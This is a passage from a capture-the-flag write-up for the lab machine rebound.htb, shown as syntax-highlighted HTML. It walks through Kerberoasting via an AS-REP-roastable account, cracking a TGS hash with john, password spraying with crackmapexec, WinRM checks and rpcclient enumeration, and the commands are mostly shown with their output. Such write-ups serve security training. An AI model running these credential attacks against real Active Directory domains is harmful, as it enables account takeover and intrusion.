                        <span class="n">Domain</span> <span class="n">to</span> <span class="n">query</span><span class="o">/</span><span class="n">request</span> <span class="k">if</span> <span class="n">different</span> <span class="n">than</span> <span class="n">the</span> <span class="n">domain</span> <span class="n">of</span> <span class="n">the</span> <span class="n">user</span><span class="o">.</span> <span class="n">Allows</span> <span class="k">for</span> <span class="n">Kerberoasting</span> <span class="n">across</span>
                        <span class="n">trusts</span><span class="o">.</span>
  <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">preauth</span> <span class="n">NO_PREAUTH</span>
                        <span class="n">account</span> <span class="n">that</span> <span class="n">does</span> <span class="ow">not</span> <span class="n">require</span> <span class="n">preauth</span><span class="p">,</span> <span class="n">to</span> <span class="n">obtain</span> <span class="n">Service</span> <span class="n">Ticket</span> <span class="n">through</span> <span class="n">the</span> <span class="n">AS</span>
  <span class="o">-</span><span class="n">stealth</span>              <span class="n">Removes</span> <span class="n">the</span> <span class="p">(</span><span class="n">servicePrincipalName</span><span class="o">=*</span><span class="p">)</span> <span class="nb">filter</span> <span class="kn">from</span> <span class="nn">the</span> <span class="n">LDAP</span> <span class="n">query</span> <span class="k">for</span> <span class="n">added</span> <span class="n">stealth</span><span class="o">.</span> <span class="n">May</span> <span class="n">cause</span> <span class="n">huge</span> <span class="n">memory</span>
                        <span class="n">consumption</span> <span class="o">/</span> <span class="n">errors</span> <span class="n">on</span> <span class="n">large</span> <span class="n">domains</span><span class="o">.</span>
  <span class="o">-</span><span class="n">usersfile</span> <span class="n">USERSFILE</span>  <span class="n">File</span> <span class="k">with</span> <span class="n">user</span> <span class="n">per</span> <span class="n">line</span> <span class="n">to</span> <span class="n">test</span>
<span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Unlike the usual kerberoasting attack, we have to specify a users file and the ASREPRoastable user:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">GetUserSPNs</span><span class="o">.</span><span class="n">py</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">preauth</span> <span class="s2">"jjones"</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">usersfile</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span>
<span class="n">Impacket</span> <span class="n">v0</span><span class="mf">.12.0</span><span class="o">.</span><span class="n">dev1</span><span class="o">+</span><span class="mf">20230928.161134</span><span class="o">.</span><span class="n">d2103449</span> <span class="o">-</span> <span class="n">Copyright</span> <span class="mi">2023</span> <span class="n">Fortra</span>

<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">Administrator</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">Guest</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="err">$</span><span class="n">krb5tgs</span><span class="err">$</span><span class="mi">18</span><span class="err">$</span><span class="n">krbtgt</span><span class="err">$</span><span class="n">REBOUND</span><span class="o">.</span><span class="n">HTB</span><span class="err">$</span><span class="o">*</span><span class="n">krbtgt</span><span class="o">*</span><span class="err">$</span><span class="mf">1e36</span><span class="n">d0b</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="n">b62bbb4c6b16bea7</span>
<span class="err">$</span><span class="n">krb5tgs</span><span class="err">$</span><span class="mi">18</span><span class="err">$</span><span class="n">DC01</span><span class="err">$$</span><span class="n">REBOUND</span><span class="o">.</span><span class="n">HTB</span><span class="err">$</span><span class="o">*</span><span class="n">DC01</span><span class="err">$</span><span class="o">*</span><span class="err">$</span><span class="mi">3</span><span class="n">fda56</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">..</span><span class="mf">.00756</span><span class="n">a59bceb</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">ppaul</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">llune</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">fflock</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">jjones</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">mmalone</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">nnoon</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="err">$</span><span class="n">krb5tgs</span><span class="err">$</span><span class="mi">23</span><span class="err">$</span><span class="o">*</span><span class="n">ldap_monitor</span><span class="err">$</span><span class="n">REBOUND</span><span class="o">.</span><span class="n">HTB</span><span class="err">$</span><span class="n">ldap_monitor</span><span class="o">*</span><span class="err">$</span><span class="mi">1</span><span class="n">f03237a7b7b</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">..</span><span class="mf">.3</span><span class="n">bf08d4f973d1c3</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">oorend</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">winrm_svc</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">batch_runner</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">Principal</span><span class="p">:</span> <span class="n">tbrady</span> <span class="o">-</span> <span class="n">Kerberos</span> <span class="n">SessionError</span><span class="p">:</span> <span class="n">KDC_ERR_S_PRINCIPAL_UNKNOWN</span><span class="p">(</span><span class="n">Server</span> <span class="ow">not</span> <span class="n">found</span> <span class="ow">in</span> <span class="n">Kerberos</span> <span class="n">database</span><span class="p">)</span>
<span class="err">$</span><span class="n">krb5tgs</span><span class="err">$</span><span class="mi">18</span><span class="err">$</span><span class="n">delegator</span><span class="err">$$</span><span class="n">REBOUND</span><span class="o">.</span><span class="n">HTB</span><span class="err">$</span><span class="o">*</span><span class="n">delegator</span><span class="err">$</span><span class="o">*</span><span class="err">$</span><span class="mi">13930</span><span class="n">cd05cfde5329</span><span class="o">...</span><span class="p">[</span><span class="n">snip</span><span class="p">]</span><span class="o">...</span><span class="n">a369c3d3391f153d88475f</span>
</pre></div>
<p>It returned four hashes, which I will save into a file to subsequently crack them.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">john</span> <span class="o">-</span><span class="n">w</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Passwords</span><span class="o">/</span><span class="n">Leaked</span><span class="o">-</span><span class="n">Databases</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span> <span class="n">krb5tgs_hashes</span><span class="o">.</span><span class="n">txt</span>
<span class="ne">Warning</span><span class="p">:</span> <span class="n">only</span> <span class="n">loading</span> <span class="n">hashes</span> <span class="n">of</span> <span class="nb">type</span> <span class="s2">"krb5tgs"</span><span class="p">,</span> <span class="n">but</span> <span class="n">also</span> <span class="n">saw</span> <span class="nb">type</span> <span class="s2">"krb5tgs-sha1"</span>
<span class="n">Use</span> <span class="n">the</span> <span class="s2">"--format=krb5tgs-sha1"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">force</span> <span class="n">loading</span> <span class="n">hashes</span> <span class="n">of</span> <span class="n">that</span> <span class="nb">type</span> <span class="n">instead</span>
<span class="n">Using</span> <span class="n">default</span> <span class="nb">input</span> <span class="n">encoding</span><span class="p">:</span> <span class="n">UTF</span><span class="o">-</span><span class="mi">8</span>
<span class="n">Loaded</span> <span class="mi">1</span> <span class="n">password</span> <span class="nb">hash</span> <span class="p">(</span><span class="n">krb5tgs</span><span class="p">,</span> <span class="n">Kerberos</span> <span class="mi">5</span> <span class="n">TGS</span><span class="o">-</span><span class="n">REP</span> <span class="n">etype</span> <span class="mi">23</span> <span class="p">[</span><span class="n">MD4</span> <span class="n">HMAC</span><span class="o">-</span><span class="n">MD5</span> <span class="n">RC4</span><span class="p">])</span>
<span class="n">Will</span> <span class="n">run</span> <span class="mi">4</span> <span class="n">OpenMP</span> <span class="n">threads</span>
<span class="n">Press</span> <span class="s1">'q'</span> <span class="ow">or</span> <span class="n">Ctrl</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">abort</span><span class="p">,</span> <span class="s1">'h'</span> <span class="k">for</span> <span class="n">help</span><span class="p">,</span> <span class="n">almost</span> <span class="nb">any</span> <span class="n">other</span> <span class="n">key</span> <span class="k">for</span> <span class="n">status</span>

<span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span>       <span class="p">(</span><span class="err">?</span><span class="p">)</span>     

<span class="mi">1</span><span class="n">g</span> <span class="mi">0</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">08</span> <span class="n">DONE</span> <span class="p">(</span><span class="mi">2024</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">29</span> <span class="mi">08</span><span class="p">:</span><span class="mi">21</span><span class="p">)</span> <span class="mf">0.1121</span><span class="n">g</span><span class="o">/</span><span class="n">s</span> <span class="mi">1461</span><span class="n">Kp</span><span class="o">/</span><span class="n">s</span> <span class="mi">1461</span><span class="n">Kc</span><span class="o">/</span><span class="n">s</span> <span class="mi">1461</span><span class="n">KC</span><span class="o">/</span><span class="n">s</span> <span class="mi">1</span><span class="n">Goatrope</span><span class="o">.</span><span class="mf">.1</span><span class="n">DEN8864</span>
<span class="n">Use</span> <span class="n">the</span> <span class="s2">"--show"</span> <span class="n">option</span> <span class="n">to</span> <span class="n">display</span> <span class="nb">all</span> <span class="n">of</span> <span class="n">the</span> <span class="n">cracked</span> <span class="n">passwords</span> <span class="n">reliably</span>
<span class="n">Session</span> <span class="n">completed</span><span class="o">.</span>
</pre></div>
<p>As you can see, one hash was successfully cracked, so we obtained a <strong>plaintext</strong> password. As I don't know who it belongs to, I'll perform <strong>password spraying</strong></p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span> <span class="o">--</span><span class="k">continue</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">success</span>
<span class="n">crackmapexec</span> <span class="n">smb</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="n">users</span><span class="o">.</span><span class="n">txt</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span> <span class="o">--</span><span class="k">continue</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">success</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="n">x64</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span> <span class="p">(</span><span class="n">signing</span><span class="p">:</span><span class="kc">True</span><span class="p">)</span> <span class="p">(</span><span class="n">SMBv1</span><span class="p">:</span><span class="kc">False</span><span class="p">)</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">Administrator</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">Guest</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">krbtgt</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">DC01</span><span class="err">$</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">ppaul</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">llune</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">fflock</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">jjones</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">mmalone</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">nnoon</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">ldap_monitor</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">oorend</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">winrm_svc</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">batch_runner</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">tbrady</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span> 
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">445</span>    <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">delegator</span><span class="err">$</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> <span class="n">STATUS_LOGON_FAILURE</span>
</pre></div>
<p>As you can see, this password belongs to the users <code>oorend</code> and <code>ldap_monitor</code>. Having <strong>valid credentials</strong> implies obtaining a <strong>broader vector</strong> for enumeration. Before beginning further enumeration, I'll check if these users belong to the <code>Remote Management Group</code>; if they do, we could gain access to the system using tools like <code>Evil-WinRM</code>.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">winrm</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'ldap_monitor'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span>
<span class="n">HTTP</span>        <span class="mf">10.10.11.231</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.231</span><span class="p">:</span><span class="mi">5985</span><span class="o">/</span><span class="n">wsman</span>
<span class="n">HTTP</span>        <span class="mf">10.10.11.231</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">ldap_monitor</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span> 
<span class="nd">elswix@ubuntu$</span> <span class="n">crackmapexec</span> <span class="n">winrm</span> <span class="mf">10.10.11.231</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'oorend'</span> <span class="o">-</span><span class="n">p</span> <span class="s1">'1GR8t@$$4u'</span>
<span class="n">SMB</span>         <span class="mf">10.10.11.231</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Windows</span> <span class="mf">10.0</span> <span class="n">Build</span> <span class="mi">17763</span> <span class="p">(</span><span class="n">name</span><span class="p">:</span><span class="n">DC01</span><span class="p">)</span> <span class="p">(</span><span class="n">domain</span><span class="p">:</span><span class="n">rebound</span><span class="o">.</span><span class="n">htb</span><span class="p">)</span>
<span class="n">HTTP</span>        <span class="mf">10.10.11.231</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.11.231</span><span class="p">:</span><span class="mi">5985</span><span class="o">/</span><span class="n">wsman</span>
<span class="n">HTTP</span>        <span class="mf">10.10.11.231</span>    <span class="mi">5985</span>   <span class="n">DC01</span>             <span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">rebound</span><span class="o">.</span><span class="n">htb</span>\<span class="n">oorend</span><span class="p">:</span><span class="mi">1</span><span class="n">GR8t</span><span class="o">@</span><span class="err">$$</span><span class="mi">4</span><span class="n">u</span>
</pre></div>
<p>They don't belong to the <code>Remote Management Users</code> group, so there is no potential vector for accessing the system via <code>WinRM</code>.</p><br/>
<h3>RPC Enumeration</h3><br/>
<p>As we have valid credentials, we could attempt to connect to the RPC service to enumerate users, groups, and gather interesting information about the DC. While LDAP is also an option, this time I'll opt for RPC.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">rpcclient</span> <span class="o">-</span><span class="n">U</span> <span class="s1">'oorend</span><span class="si">%1G</span><span class="s1">R8t@$$4u'</span> <span class="mf">10.10.11.231</span>
<span class="nd">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span>
</pre></div>
<p>It worked! Now we can start our enumeration. We already have valid users. Additionally, we can explore existing groups on the DC:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">rpcclient</span> <span class="err">$</span><span class="o">&gt;</span> <span class="n">enumdomgroups</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Enterprise</span> <span class="n">Read</span><span class="o">-</span><span class="n">only</span> <span class="n">Domain</span> <span class="n">Controllers</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x1f2</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Domain</span> <span class="n">Admins</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x200</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Domain</span> <span class="n">Users</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x201</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Domain</span> <span class="n">Guests</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x202</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Domain</span> <span class="n">Computers</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x203</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Domain</span> <span class="n">Controllers</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x204</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Schema</span> <span class="n">Admins</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x206</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Enterprise</span> <span class="n">Admins</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x207</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Group</span> <span class="n">Policy</span> <span class="n">Creator</span> <span class="n">Owners</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x208</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Read</span><span class="o">-</span><span class="n">only</span> <span class="n">Domain</span> <span class="n">Controllers</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x209</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Cloneable</span> <span class="n">Domain</span> <span class="n">Controllers</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x20a</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Protected</span> <span class="n">Users</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x20d</span><span class="p">]</span>
<span class="n">group</span><span class="p">:[</span><span class="n">Key</span> <span class="n">Admins</span><span class="p">]</span> <span class="n">rid</span><span class="p">:[</span><span class="mh">0x20e</span><span class="p">]</span>
